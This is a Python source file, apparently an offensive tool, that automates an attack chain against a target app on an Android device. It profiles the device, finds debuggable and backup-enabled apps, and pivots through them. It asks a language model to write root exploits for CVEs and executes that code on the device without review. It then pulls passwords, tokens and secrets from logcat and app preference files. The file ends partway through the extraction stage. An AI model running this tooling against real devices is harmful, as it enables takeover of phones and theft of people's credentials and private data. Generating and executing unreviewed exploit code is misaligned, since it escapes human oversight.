"""
Sequential Attack Chain with Feedback Loops

A methodological attack chain that:
1. Executes phases in strict dependency order
2. Reviews feedback after each attempt
3. Adapts strategy based on results
4. Generates comprehensive exploitation report

Attack Sequence:
    RECON → INITIAL_ACCESS → PRIVILEGE_ESCALATION → ROOT → DATA_EXTRACTION

Each phase requires success of previous phase before proceeding.

For authorized security testing only.
"""

import json
import logging
import os
import re
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from pathlib import Path
from typing import Callable, Optional

logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════════════════════
# DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════════════════

class AttackStage(Enum):
    """Sequential attack stages - must be executed in order."""
    RECONNAISSANCE = auto()      # Gather intelligence
    INITIAL_ACCESS = auto()      # Get foothold (any user access)
    PRIVILEGE_ESCALATION = auto()  # Elevate to system/root
    PERSISTENCE = auto()         # Maintain access
    DATA_EXFILTRATION = auto()   # Extract target data


class AccessLevel(Enum):
    """Current access level achieved."""
    NONE = 0
    APP_USER = 1          # run-as access
    SYSTEM_USER = 2       # system UID
    ROOT = 3              # uid=0


@dataclass
class StageResult:
    """Result of an attack stage."""
    stage: AttackStage
    success: bool
    access_achieved: AccessLevel
    method_used: str
    output: str
    attempts: list = field(default_factory=list)
    duration: float = 0.0
    next_stage_enabled: bool = False


@dataclass
class ExploitAttempt:
    """Single exploitation attempt with feedback."""
    method: str
    cve_id: Optional[str]
    code: str
    output: str
    success: bool
    feedback: str  # Why it failed or succeeded
    adaptation: str  # What to try next


@dataclass
class ExploitReport:
    """Final comprehensive report."""
    target_device: str
    target_package: str
    timestamp: datetime
    total_duration: float
    final_access_level: AccessLevel
    stages_completed: list
    successful_exploits: list  # Working exploits with code
    failed_attempts: list  # What didn't work and why
    data_extracted: dict
    reproduction_steps: list  # How to reproduce the attack


# ═══════════════════════════════════════════════════════════════════════════
# MAIN ATTACK CHAIN
# ═══════════════════════════════════════════════════════════════════════════

class SequentialAttackChain:
    """
    Sequential attack chain with feedback loops.

    Attack flow:
        1. RECONNAISSANCE: Profile target, find attack surface
        2. INITIAL_ACCESS: Get any foothold (debuggable app, exposed service)
        3. PRIVILEGE_ESCALATION: Escalate using CVEs, gain root
        4. PERSISTENCE: Maintain access
        5. DATA_EXFILTRATION: Extract target data

    Each stage must succeed before the next can begin.
    Failed attempts are analyzed and strategy is adapted.
    """

    MAX_ATTEMPTS_PER_STAGE = 3

    def __init__(
        self,
        device_id: str,
        target_package: str,
        nvd_api_key: Optional[str] = None,
        llm_client=None,
        output_dir: str = "output/sequential_chains",
    ):
        self.device_id = device_id
        self.target_package = target_package
        self.nvd_api_key = nvd_api_key or os.getenv("NVD_API_KEY")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # LLM client
        if llm_client is None:
            from agent import LLMClient
            self.llm_client = LLMClient.create()
        else:
            self.llm_client = llm_client

        # State
        self.current_access = AccessLevel.NONE
        self.device_profile = {}
        self.cve_candidates = []
        self.stage_results = []
        self.all_attempts = []
        self.successful_exploits = []
        self.extracted_data = {}

    def execute(self, callback: Optional[Callable] = None) -> ExploitReport:
        """Execute the full sequential attack chain."""
        start_time = time.time()

        def report(stage: AttackStage, msg: str):
            if callback:
                callback(stage, msg)
            print(f"[{stage.name}] {msg}")

        # ═══════════════════════════════════════════════════════════════
        # STAGE 1: RECONNAISSANCE
        # ═══════════════════════════════════════════════════════════════
        report(AttackStage.RECONNAISSANCE, "Starting reconnaissance...")
        recon_result = self._stage_reconnaissance()
        self.stage_results.append(recon_result)

        if not recon_result.success:
            return self._generate_report(time.time() - start_time)

        report(AttackStage.RECONNAISSANCE,
            f"Target profiled: Android {self.device_profile.get('android_version')}, "
            f"Patch {self.device_profile.get('security_patch')}")

        # ═══════════════════════════════════════════════════════════════
        # STAGE 2: INITIAL ACCESS
        # ═══════════════════════════════════════════════════════════════
        report(AttackStage.INITIAL_ACCESS, "Attempting initial access...")
        access_result = self._stage_initial_access()
        self.stage_results.append(access_result)

        if access_result.success:
            self.current_access = access_result.access_achieved
            report(AttackStage.INITIAL_ACCESS,
                f"✓ Access achieved: {access_result.access_achieved.name} via {access_result.method_used}")

        # ═══════════════════════════════════════════════════════════════
        # STAGE 3: PRIVILEGE ESCALATION
        # ═══════════════════════════════════════════════════════════════
        if self.current_access.value < AccessLevel.ROOT.value:
            report(AttackStage.PRIVILEGE_ESCALATION, "Attempting privilege escalation...")
            privesc_result = self._stage_privilege_escalation()
            self.stage_results.append(privesc_result)

            if privesc_result.success:
                self.current_access = privesc_result.access_achieved
                report(AttackStage.PRIVILEGE_ESCALATION,
                    f"✓ Escalated to: {privesc_result.access_achieved.name}")

        # ═══════════════════════════════════════════════════════════════
        # STAGE 4: DATA EXFILTRATION
        # ═══════════════════════════════════════════════════════════════
        report(AttackStage.DATA_EXFILTRATION, f"Extracting data from {self.target_package}...")
        exfil_result = self._stage_data_exfiltration()
        self.stage_results.append(exfil_result)

        if exfil_result.success:
            report(AttackStage.DATA_EXFILTRATION,
                f"✓ Extracted {len(self.extracted_data)} data sources")

        # Generate final report
        return self._generate_report(time.time() - start_time)

    # ═══════════════════════════════════════════════════════════════════════════
    # STAGE IMPLEMENTATIONS
    # ═══════════════════════════════════════════════════════════════════════════

    def _stage_reconnaissance(self) -> StageResult:
        """Stage 1: Deep reconnaissance with app vulnerability detection."""
        start = time.time()
        attempts = []

        def adb_prop(prop):
            _, val = self._adb(f"getprop {prop}")
            return val

        try:
            # ─────────────────────────────────────────────────────────────────
            # DEVICE PROFILING
            # ─────────────────────────────────────────────────────────────────
            print("  → Collecting device information...")
            self.device_profile = {
                "android_version": adb_prop("ro.build.version.release"),
                "api_level": int(adb_prop("ro.build.version.sdk") or "0"),
                "security_patch": adb_prop("ro.build.version.security_patch"),
                "manufacturer": adb_prop("ro.product.manufacturer"),
                "model": adb_prop("ro.product.model"),
                "hardware": adb_prop("ro.hardware"),
                "is_emulator": adb_prop("ro.kernel.qemu") == "1",
            }

            # Kernel info
            _, kernel = self._adb("uname -r")
            self.device_profile["kernel"] = kernel
            self.device_profile["kernel_major"] = re.match(r"(\d+\.\d+)", kernel)
            if self.device_profile["kernel_major"]:
                self.device_profile["kernel_major"] = self.device_profile["kernel_major"].group(1)

            # Architecture
            _, arch = self._adb("uname -m")
            self.device_profile["arch"] = arch

            # SELinux
            _, selinux = self._adb("getenforce")
            self.device_profile["selinux"] = selinux.lower()

            # Current access level
            _, id_out = self._adb("id")
            if "uid=0" in id_out:
                self.current_access = AccessLevel.ROOT
            self.device_profile["current_uid"] = id_out

            # System debuggable
            _, debuggable = self._adb("getprop ro.debuggable")
            self.device_profile["system_debuggable"] = debuggable == "1"

            # ─────────────────────────────────────────────────────────────────
            # APP VULNERABILITY DETECTION (Critical for userland exploits)
            # ─────────────────────────────────────────────────────────────────
            print("  → Scanning for app misconfigurations...")

            # Initialize vulnerability tracking
            self.device_profile["app_vulnerabilities"] = []
            self.device_profile["debuggable_apps"] = []
            self.device_profile["backup_enabled_apps"] = []
            self.device_profile["exported_components"] = []

            # 1. Check if TARGET app is debuggable (common shipping mistake)
            _, pkg_info = self._adb(f"pm dump {self.target_package} | grep -E 'flags|versionName'")
            self.device_profile["target_package_info"] = pkg_info
            self.device_profile["target_debuggable"] = "DEBUGGABLE" in pkg_info

            if self.device_profile["target_debuggable"]:
                self.device_profile["app_vulnerabilities"].append({
                    "type": "DEBUGGABLE_APP",
                    "package": self.target_package,
                    "severity": "HIGH",
                    "description": "App shipped in debug mode - run-as access possible",
                    "exploitation": "adb shell run-as <package>"
                })
                print("    ⚠️  FOUND: Target app is DEBUGGABLE (HIGH severity)")

            # 2. Check if backup is enabled (allows data extraction via backup)
            _, backup_info = self._adb(f"pm dump {self.target_package} | grep allowBackup")
            self.device_profile["target_backup_enabled"] = "allowBackup=true" in backup_info

            if self.device_profile["target_backup_enabled"]:
                self.device_profile["app_vulnerabilities"].append({
                    "type": "BACKUP_ENABLED",
                    "package": self.target_package,
                    "severity": "MEDIUM",
                    "description": "App allows backup - data can be extracted via adb backup",
                    "exploitation": "adb backup -f backup.ab <package>"
                })
                print("    ⚠️  FOUND: Target app allows BACKUP (MEDIUM severity)")

            # 3. Enumerate ALL installed apps with versions (attack surface mapping)
            print("  → Enumerating installed applications...")
            self.device_profile["installed_apps"] = []

            _, all_pkgs = self._adb("pm list packages -3")
            for line in all_pkgs.split('\n'):
                pkg = line.replace("package:", "").strip()
                if not pkg:
                    continue

                # Get version info
                _, version_info = self._adb(f"dumpsys package {pkg} | grep -E 'versionName|versionCode' | head -2")
                version_name = ""
                version_code = ""
                for vline in version_info.split('\n'):
                    if "versionName" in vline:
                        match = re.search(r'versionName=([^\s]+)', vline)
                        if match:
                            version_name = match.group(1)
                    if "versionCode" in vline:
                        match = re.search(r'versionCode=(\d+)', vline)
                        if match:
                            version_code = match.group(1)

                # Get flags
                _, pkg_flags = self._adb(f"pm dump {pkg} | grep 'flags=' | head -1")
                is_debuggable = "DEBUGGABLE" in pkg_flags
                allows_backup = "ALLOW_BACKUP" in pkg_flags

                app_info = {
                    "package": pkg,
                    "version_name": version_name,
                    "version_code": version_code,
                    "debuggable": is_debuggable,
                    "allows_backup": allows_backup,
                }
                self.device_profile["installed_apps"].append(app_info)

                if is_debuggable:
                    self.device_profile["debuggable_apps"].append(pkg)
                    if pkg != self.target_package:
                        self.device_profile["app_vulnerabilities"].append({
                            "type": "DEBUGGABLE_APP",
                            "package": pkg,
                            "severity": "HIGH",
                            "description": f"Third-party app in debug mode (v{version_name})",
                            "exploitation": f"adb shell run-as {pkg}"
                        })

            print(f"    → Found {len(self.device_profile['installed_apps'])} third-party apps")
            if len(self.device_profile["debuggable_apps"]) > 0:
                print(f"    ⚠️  FOUND: {len(self.device_profile['debuggable_apps'])} debuggable apps")

            # 3b. Check installed apps against NVD for known CVEs
            print("  → Checking apps against NVD for known vulnerabilities...")
            self._check_app_cves()

            # 4. Check for exported components (activity hijacking, broadcast injection)
            _, exported = self._adb(
                f"pm dump {self.target_package} | grep -E 'exported=true|android:exported'"
            )
            if exported:
                exported_count = exported.count("exported=true") + exported.count("android:exported=\"true\"")
                if exported_count > 0:
                    self.device_profile["exported_components"] = exported_count
                    self.device_profile["app_vulnerabilities"].append({
                        "type": "EXPORTED_COMPONENTS",
                        "package": self.target_package,
                        "severity": "MEDIUM",
                        "description": f"{exported_count} exported components - potential injection points",
                        "exploitation": "am start -n <package>/<activity> / am broadcast"
                    })
                    print(f"    ⚠️  FOUND: {exported_count} exported components")

            # 5. Check for world-readable files (bad permissions)
            _, world_readable = self._adb(
                f"run-as {self.target_package} ls -la 2>/dev/null | grep -E 'rw.rw.r--|rwxrwxrwx'"
            )
            if world_readable and "No such" not in world_readable:
                self.device_profile["app_vulnerabilities"].append({
                    "type": "WORLD_READABLE_FILES",
                    "package": self.target_package,
                    "severity": "LOW",
                    "description": "Files with weak permissions",
                    "exploitation": "Direct file read access"
                })
                print("    ⚠️  FOUND: World-readable files")

            # 6. Check for insecure logging (credentials in logcat)
            _, log_leaks = self._adb(
                f"logcat -d | grep -i '{self.target_package}' | grep -iE 'password|token|secret|key|auth' | head -5"
            )
            if log_leaks:
                self.device_profile["app_vulnerabilities"].append({
                    "type": "INSECURE_LOGGING",
                    "package": self.target_package,
                    "severity": "HIGH",
                    "description": "Sensitive data leaked to logcat",
                    "exploitation": "adb logcat -d | grep <pattern>"
                })
                print("    ⚠️  FOUND: Credentials leaked in LOGCAT (HIGH severity)")

            # Summary of attack surface
            total_vulns = len(self.device_profile["app_vulnerabilities"])
            print(f"  → App vulnerability scan complete: {total_vulns} issues found")

            # Query NVD for CVEs
            print("  → Querying NVD for kernel/system CVEs...")
            self._query_cves()

            attempts.append(ExploitAttempt(
                method="device_profiling",
                cve_id=None,
                code="adb shell getprop / uname / getenforce / pm dump",
                output=json.dumps({
                    "device": {
                        "android": self.device_profile.get("android_version"),
                        "kernel": self.device_profile.get("kernel_major"),
                        "patch": self.device_profile.get("security_patch"),
                    },
                    "vulnerabilities_found": len(self.device_profile.get("app_vulnerabilities", [])),
                    "debuggable_apps": len(self.device_profile.get("debuggable_apps", [])),
                    "cves_matched": len(self.cve_candidates),
                }, indent=2),
                success=True,
                feedback=f"Profiled device, found {len(self.device_profile.get('app_vulnerabilities', []))} app vulnerabilities",
                adaptation="Use detected vulnerabilities for initial access"
            ))

            # Determine best attack path based on recon
            attack_paths = []

            # Primary: Target app vulnerabilities
            if self.device_profile.get("target_debuggable"):
                attack_paths.append("TARGET_DEBUGGABLE (run-as) - HIGH success")
            if self.device_profile.get("target_backup_enabled"):
                attack_paths.append("TARGET_BACKUP (adb backup) - MEDIUM success")

            # Secondary: Pivot through other vulnerable apps
            other_debuggable = [
                app for app in self.device_profile.get("debuggable_apps", [])
                if app != self.target_package
            ]
            if other_debuggable and not self.device_profile.get("target_debuggable"):
                attack_paths.append(f"PIVOT_APP ({other_debuggable[0]}) - Gain foothold, then attack target")
                self.device_profile["pivot_candidates"] = other_debuggable

            # Tertiary: Kernel/System exploitation
            if self.cve_candidates:
                attack_paths.append(f"KERNEL_CVE ({len(self.cve_candidates)} candidates) - Requires exploit dev")

            # If no paths found
            if not attack_paths:
                attack_paths.append("NO_EASY_PATH - Target well-secured, need 0-day or physical access")

            print(f"  → Recommended attack paths: {', '.join(attack_paths) if attack_paths else 'Kernel CVEs only'}")

            return StageResult(
                stage=AttackStage.RECONNAISSANCE,
                success=True,
                access_achieved=self.current_access,
                method_used="comprehensive_recon",
                output=json.dumps({
                    "device": self.device_profile,
                    "attack_paths": attack_paths,
                }),
                attempts=attempts,
                duration=time.time() - start,
                next_stage_enabled=True
            )

        except Exception as e:
            attempts.append(ExploitAttempt(
                method="device_profiling",
                cve_id=None,
                code="",
                output=str(e),
                success=False,
                feedback=f"Reconnaissance failed: {e}",
                adaptation="Check ADB connection"
            ))

            return StageResult(
                stage=AttackStage.RECONNAISSANCE,
                success=False,
                access_achieved=AccessLevel.NONE,
                method_used="failed",
                output=str(e),
                attempts=attempts,
                duration=time.time() - start,
                next_stage_enabled=False
            )

    def _check_app_cves(self):
        """Check installed apps against NVD for known vulnerabilities."""
        import requests

        if not self.nvd_api_key:
            print("    → Skipping NVD app check (no API key)")
            return

        headers = {"apiKey": self.nvd_api_key}
        base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"

        self.device_profile["app_cves"] = []

        # Check each installed app
        for app in self.device_profile.get("installed_apps", []):
            pkg = app["package"]
            version = app["version_name"]

            # Extract app name from package (e.g., "jakhar.aseem.diva" -> "diva")
            app_name = pkg.split(".")[-1] if "." in pkg else pkg

            # Skip common/system-like packages
            if app_name in ["app", "android", "google", "system"]:
                continue

            try:
                # Search NVD for this app
                response = requests.get(
                    base_url,
                    headers=headers,
                    params={"keywordSearch": f"{app_name} android", "resultsPerPage": 10},
                    timeout=30
                )

                if response.status_code != 200:
                    continue

                data = response.json()
                cves = data.get("vulnerabilities", [])

                for item in cves:
                    cve = item.get("cve", {})
                    cve_id = cve.get("id", "")

                    # Get CVSS
                    metrics = cve.get("metrics", {})
                    cvss = 0.0
                    if "cvssMetricV31" in metrics:
                        cvss = metrics["cvssMetricV31"][0]["cvssData"].get("baseScore", 0)

                    if cvss < 5.0:
                        continue

                    # Get description
                    desc = ""
                    for d in cve.get("descriptions", []):
                        if d.get("lang") == "en":
                            desc = d.get("value", "")[:100]
                            break

                    # Check if version is mentioned in CVE (rough matching)
                    version_affected = False
                    if version:
                        # Check if our version might be affected
                        # This is heuristic - real implementation would parse CPE
                        configurations = cve.get("configurations", [])
                        for config in configurations:
                            config_str = json.dumps(config).lower()
                            if version.lower() in config_str or app_name.lower() in config_str:
                                version_affected = True
                                break

                    if cve_id not in [c["cve_id"] for c in self.device_profile["app_cves"]]:
                        self.device_profile["app_cves"].append({
                            "cve_id": cve_id,
                            "app_package": pkg,
                            "app_version": version,
                            "cvss": cvss,
                            "description": desc,
                            "version_match": version_affected,
                        })

                        # Add to vulnerabilities if high severity
                        if cvss >= 7.0:
                            self.device_profile["app_vulnerabilities"].append({
                                "type": "APP_CVE",
                                "package": pkg,
                                "severity": "HIGH" if cvss >= 7.0 else "MEDIUM",
                                "description": f"{cve_id} (CVSS {cvss}) - {desc}",
                                "exploitation": f"Exploit {cve_id} in {pkg} v{version}"
                            })
                            print(f"    ⚠️  FOUND: {cve_id} affects {app_name} (CVSS {cvss})")

            except Exception as e:
                logger.debug(f"Error checking {pkg}: {e}")
                continue

        if self.device_profile["app_cves"]:
            print(f"    → Found {len(self.device_profile['app_cves'])} potential app CVEs")

    def _query_cves(self):
        """Query NVD API for relevant system/kernel CVEs."""
        import requests

        if not self.nvd_api_key:
            return

        headers = {"apiKey": self.nvd_api_key}
        base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"

        # Parse patch date
        try:
            patch_date = datetime.strptime(
                self.device_profile.get("security_patch", "2023-01-01"),
                "%Y-%m-%d"
            )
        except ValueError:
            patch_date = datetime.now()

        queries = [
            f"Android {self.device_profile.get('android_version')}",
            "Android privilege escalation",
        ]

        for query in queries:
            try:
                response = requests.get(
                    base_url,
                    headers=headers,
                    params={"keywordSearch": query, "resultsPerPage": 50},
                    timeout=60
                )

                if response.status_code == 200:
                    data = response.json()
                    for item in data.get("vulnerabilities", []):
                        cve = item.get("cve", {})
                        cve_id = cve.get("id", "")
                        published = cve.get("published", "")[:10]

                        # Only post-patch CVEs
                        try:
                            pub_date = datetime.strptime(published, "%Y-%m-%d")
                            if pub_date <= patch_date:
                                continue
                        except ValueError:
                            continue

                        # Get CVSS
                        metrics = cve.get("metrics", {})
                        cvss = 0.0
                        if "cvssMetricV31" in metrics:
                            cvss = metrics["cvssMetricV31"][0]["cvssData"].get("baseScore", 0)

                        if cvss >= 7.0:
                            # Check for PoC
                            has_poc = any(
                                "Exploit" in ref.get("tags", []) or "github" in ref.get("url", "")
                                for ref in cve.get("references", [])
                            )

                            # Days since patch
                            days = (pub_date - patch_date).days

                            if cve_id not in [c["id"] for c in self.cve_candidates]:
                                self.cve_candidates.append({
                                    "id": cve_id,
                                    "cvss": cvss,
                                    "has_poc": has_poc,
                                    "days_after_patch": days,
                                    "published": published,
                                })

            except Exception as e:
                logger.debug(f"CVE query failed: {e}")

        # Sort by likelihood
        self.cve_candidates.sort(
            key=lambda c: (c["has_poc"], -c["days_after_patch"], c["cvss"]),
            reverse=True
        )

    def _stage_initial_access(self) -> StageResult:
        """Stage 2: Get initial foothold."""
        start = time.time()
        attempts = []

        if self.current_access.value >= AccessLevel.APP_USER.value:
            return StageResult(
                stage=AttackStage.INITIAL_ACCESS,
                success=True,
                access_achieved=self.current_access,
                method_used="already_have_access",
                output="Already have sufficient access",
                attempts=attempts,
                duration=time.time() - start,
                next_stage_enabled=True
            )

        # ─────────────────────────────────────────────────────────────────
        # Attempt 1: ADB root (emulator mode)
        # ─────────────────────────────────────────────────────────────────
        print("  → Trying ADB root...")
        try:
            result = subprocess.run(
                ["adb", "-s", self.device_id, "root"],
                capture_output=True, text=True, timeout=10
            )
            time.sleep(2)
            subprocess.run(["adb", "-s", self.device_id, "wait-for-device"], timeout=10)

            _, id_out = self._adb("id")
            if "uid=0" in id_out:
                attempts.append(ExploitAttempt(
                    method="adb_root",
                    cve_id=None,
                    code="adb -s DEVICE root",
                    output=id_out,
                    success=True,
                    feedback="ADB root successful - device in root mode",
                    adaptation="Proceed to data extraction"
                ))
                self.successful_exploits.append({
                    "method": "adb_root",
                    "command": f"adb -s {self.device_id} root",
                    "access_level": "ROOT"
                })
                return StageResult(
                    stage=AttackStage.INITIAL_ACCESS,
                    success=True,
                    access_achieved=AccessLevel.ROOT,
                    method_used="adb_root",
                    output=id_out,
                    attempts=attempts,
                    duration=time.time() - start,
                    next_stage_enabled=True
                )
            else:
                attempts.append(ExploitAttempt(
                    method="adb_root",
                    cve_id=None,
                    code="adb root",
                    output=result.stdout + result.stderr,
                    success=False,
                    feedback="ADB root not supported on this device",
                    adaptation="Try run-as for debuggable apps"
                ))
        except Exception as e:
            attempts.append(ExploitAttempt(
                method="adb_root",
                cve_id=None,
                code="adb root",
                output=str(e),
                success=False,
                feedback=f"ADB root failed: {e}",
                adaptation="Try alternative access methods"
            ))

        # ─────────────────────────────────────────────────────────────────
        # Attempt 2: run-as for debuggable package
        # ─────────────────────────────────────────────────────────────────
        if self.device_profile.get("target_debuggable"):
            print("  → Trying run-as...")
            _, run_as = self._adb(f"run-as {self.target_package} id")
            if "uid=" in run_as and "not debuggable" not in run_as:
                attempts.append(ExploitAttempt(
                    method="run_as",
                    cve_id=None,
                    code=f"adb shell run-as {self.target_package}",
                    output=run_as,
                    success=True,
                    feedback="run-as successful for debuggable app",
                    adaptation="Can access app's private data"
                ))
                self.successful_exploits.append({
                    "method": "run_as",
                    "command": f"adb -s {self.device_id} shell run-as {self.target_package}",
                    "access_level": "APP_USER"
                })
                return StageResult(
                    stage=AttackStage.INITIAL_ACCESS,
                    success=True,
                    access_achieved=AccessLevel.APP_USER,
                    method_used="run_as",
                    output=run_as,
                    attempts=attempts,
                    duration=time.time() - start,
                    next_stage_enabled=True
                )
            else:
                attempts.append(ExploitAttempt(
                    method="run_as",
                    cve_id=None,
                    code=f"run-as {self.target_package}",
                    output=run_as,
                    success=False,
                    feedback="Package not debuggable or run-as failed",
                    adaptation="Try pivot through other debuggable apps"
                ))

        # ─────────────────────────────────────────────────────────────────
        # Attempt 3: PIVOT through other debuggable apps
        # ─────────────────────────────────────────────────────────────────
        pivot_candidates = self.device_profile.get("pivot_candidates", [])
        if pivot_candidates:
            for pivot_pkg in pivot_candidates[:2]:  # Try up to 2 pivot apps
                print(f"  → Trying PIVOT through {pivot_pkg}...")

                # Step 1: Get access to pivot app
                _, pivot_access = self._adb(f"run-as {pivot_pkg} id")
                if "uid=" not in pivot_access:
                    continue

                # Step 2: From pivot app, try to access target
                # Check if they share a user ID or have accessible content providers
                _, target_providers = self._adb(
                    f"pm dump {self.target_package} | grep -E 'ContentProvider|android:authorities'"
                )

                pivot_data = {"pivot_app": pivot_pkg, "pivot_access": pivot_access}

                # Try content provider access from pivot context
                if target_providers:
                    # Extract provider authorities
                    authorities = re.findall(r'android:authorities="([^"]+)"', target_providers)
                    for auth in authorities:
                        _, provider_data = self._adb(f"content query --uri content://{auth}")
                        if provider_data and "No such" not in provider_data and "Permission" not in provider_data:
                            pivot_data["provider_data"] = provider_data

                # Check shared processes/user IDs
                _, pivot_uid = self._adb(f"dumpsys package {pivot_pkg} | grep userId")
                _, target_uid = self._adb(f"dumpsys package {self.target_package} | grep userId")

                if pivot_uid and target_uid:
                    pivot_data["pivot_uid"] = pivot_uid
                    pivot_data["target_uid"] = target_uid
                    # If same sharedUserId, we have cross-app access!
                    if "sharedUserId" in pivot_uid and pivot_uid == target_uid:
                        pivot_data["shared_user"] = True

                attempts.append(ExploitAttempt(
                    method=f"pivot_{pivot_pkg}",
                    cve_id=None,
                    code=f"run-as {pivot_pkg} → attack {self.target_package}",
                    output=json.dumps(pivot_data),
                    success=True,
                    feedback=f"Pivot access via {pivot_pkg} established",
                    adaptation="Use pivot for further attacks or kernel escalation"
                ))

                self.successful_exploits.append({
                    "method": "pivot_attack",
                    "pivot_app": pivot_pkg,
                    "command": f"adb -s {self.device_id} shell run-as {pivot_pkg}",
                    "access_level": "PIVOT_USER",
                    "data": pivot_data
                })

                return StageResult(
                    stage=AttackStage.INITIAL_ACCESS,
                    success=True,
                    access_achieved=AccessLevel.APP_USER,
                    method_used=f"pivot_{pivot_pkg}",
                    output=f"Pivot established via {pivot_pkg}",
                    attempts=attempts,
                    duration=time.time() - start,
                    next_stage_enabled=True
                )

        self.all_attempts.extend(attempts)

        # No initial access achieved
        return StageResult(
            stage=AttackStage.INITIAL_ACCESS,
            success=False,
            access_achieved=AccessLevel.NONE,
            method_used="none",
            output="All initial access attempts failed",
            attempts=attempts,
            duration=time.time() - start,
            next_stage_enabled=True  # Still try privesc
        )

    def _stage_privilege_escalation(self) -> StageResult:
        """Stage 3: Escalate privileges using CVEs."""
        start = time.time()
        attempts = []

        if self.current_access == AccessLevel.ROOT:
            return StageResult(
                stage=AttackStage.PRIVILEGE_ESCALATION,
                success=True,
                access_achieved=AccessLevel.ROOT,
                method_used="already_root",
                output="Already have root",
                attempts=attempts,
                duration=time.time() - start,
                next_stage_enabled=True
            )

        # Try top CVE candidates
        for i, cve in enumerate(self.cve_candidates[:3]):
            print(f"  → Attempting {cve['id']} (CVSS: {cve['cvss']}, PoC: {cve['has_poc']})...")

            attempt = self._try_cve_exploit(cve)
            attempts.append(attempt)
            self.all_attempts.append(attempt)

            if attempt.success:
                self.current_access = AccessLevel.ROOT
                self.successful_exploits.append({
                    "method": "cve_exploit",
                    "cve_id": cve["id"],
                    "code": attempt.code,
                    "access_level": "ROOT"
                })
                return StageResult(
                    stage=AttackStage.PRIVILEGE_ESCALATION,
                    success=True,
                    access_achieved=AccessLevel.ROOT,
                    method_used=f"cve_{cve['id']}",
                    output=attempt.output,
                    attempts=attempts,
                    duration=time.time() - start,
                    next_stage_enabled=True
                )

            # Analyze feedback and adapt
            print(f"    ✗ Failed: {attempt.feedback[:50]}")
            print(f"    → Adapting: {attempt.adaptation}")

        return StageResult(
            stage=AttackStage.PRIVILEGE_ESCALATION,
            success=False,
            access_achieved=self.current_access,
            method_used="none",
            output="All privilege escalation attempts failed",
            attempts=attempts,
            duration=time.time() - start,
            next_stage_enabled=True  # Still try data extraction
        )

    def _try_cve_exploit(self, cve: dict) -> ExploitAttempt:
        """Try to exploit a specific CVE with LLM-generated code."""

        prompt = f"""Generate an exploit for {cve['id']} on Android.

Target:
- Device: {self.device_profile.get('manufacturer')} {self.device_profile.get('model')}
- Android: {self.device_profile.get('android_version')}
- Kernel: {self.device_profile.get('kernel')}
- Architecture: {self.device_profile.get('arch')}
- ADB: {self.device_id}
- SELinux: {self.device_profile.get('selinux')}

CVE: {cve['id']} (CVSS: {cve['cvss']})

Requirements:
1. Use subprocess for ADB commands
2. Goal: Achieve uid=0 (root)
3. Print "[EXPLOIT_SUCCESS]" if successful
4. Print "[EXPLOIT_FAILED]: reason" if failed

Output ONLY executable Python code."""

        try:
            response = self.llm_client.complete(
                prompt,
                system="You are an Android security researcher. Generate working exploit code."
            )

            code = response.content
            if "```python" in code:
                match = re.search(r"```python\n(.*?)```", code, re.DOTALL)
                if match:
                    code = match.group(1)

            # Save and execute
            exploit_path = self.output_dir / f"exploit_{cve['id'].replace('-', '_')}.py"
            exploit_path.write_text(code)

            result = subprocess.run(
                ["python3", str(exploit_path)],
                capture_output=True, text=True, timeout=120,
                env={**os.environ, "DEVICE_ID": self.device_id}
            )

            output = result.stdout + result.stderr

            # Check success
            success = False
            if "[EXPLOIT_SUCCESS]" in output:
                success = True
            else:
                # Verify with ADB
                _, id_out = self._adb("id")
                success = "uid=0" in id_out

            if success:
                return ExploitAttempt(
                    method=f"cve_exploit_{cve['id']}",
                    cve_id=cve['id'],
                    code=code,
                    output=output,
                    success=True,
                    feedback="Exploit successful - root achieved",
                    adaptation="Proceed to data extraction"
                )
            else:
                # Analyze failure
                feedback = "Unknown failure"
                adaptation = "Try different approach"

                if "permission denied" in output.lower():
                    feedback = "Permission denied - SELinux or insufficient privileges"
                    adaptation = "Try SELinux bypass first"
                elif "not found" in output.lower():
                    feedback = "Binary or path not found"
                    adaptation = "Check paths and binaries on target"
                elif "timeout" in output.lower():
                    feedback = "Exploit timed out"
                    adaptation = "Reduce exploit complexity"
                elif "[EXPLOIT_FAILED]" in output:
                    match = re.search(r"\[EXPLOIT_FAILED\]:\s*(.+)", output)
                    if match:
                        feedback = match.group(1)
                        adaptation = f"Address: {feedback}"

                return ExploitAttempt(
                    method=f"cve_exploit_{cve['id']}",
                    cve_id=cve['id'],
                    code=code,
                    output=output[:500],
                    success=False,
                    feedback=feedback,
                    adaptation=adaptation
                )

        except Exception as e:
            return ExploitAttempt(
                method=f"cve_exploit_{cve['id']}",
                cve_id=cve['id'],
                code="",
                output=str(e),
                success=False,
                feedback=f"Exception: {e}",
                adaptation="Check LLM connection and retry"
            )

    def _stage_data_exfiltration(self) -> StageResult:
        """Stage 4: Extract data from target."""
        start = time.time()
        attempts = []

        # ─────────────────────────────────────────────────────────────────
        # Vector 1: Logcat (always works, no root needed)
        # ─────────────────────────────────────────────────────────────────
        print("  → Extracting from logcat...")
        _, logcat = self._adb(f"logcat -d | grep -i '{self.target_package}'")
        if logcat:
            self.extracted_data["logcat"] = logcat

            # Find credentials
            creds = re.findall(
                r'(?:password|user|email|token|secret)[=:\s]+([^\s,\]"]+)',
                logcat, re.IGNORECASE
            )
            if creds:
                self.extracted_data["logcat_credentials"] = list(set(creds))

            attempts.append(ExploitAttempt(
                method="logcat_extraction",
                cve_id=None,
                code=f"adb logcat -d | grep '{self.target_package}'",
                output=f"Found {len(logcat)} bytes",
                success=True,
                feedback="Extracted logs with potential credentials",
                adaptation="Check for sensitive data in logs"
            ))

        # ─────────────────────────────────────────────────────────────────
        # Vector 2: Root access data extraction
        # ─────────────────────────────────────────────────────────────────
        if self.current_access == AccessLevel.ROOT:
            print("  → Extracting private app data (root)...")

            data_dir = f"/data/data/{self.target_package}"

            # Shared preferences
            _, prefs = self._adb(f"cat {data_dir}/shared_prefs/*.xml 2>/dev/null")
            if prefs and "No such" not in prefs:
                self.extracted_data["shared_preferences"] = prefs

                # Extract secrets
                secrets = re.findall(
                    r'(?:password|key|secret|token|auth)[^>]*>([^<]+)<',
                    prefs, re.IGNORECASE
                )
                if secrets:
                    self.extracted_data["extracted_secrets"] = secrets

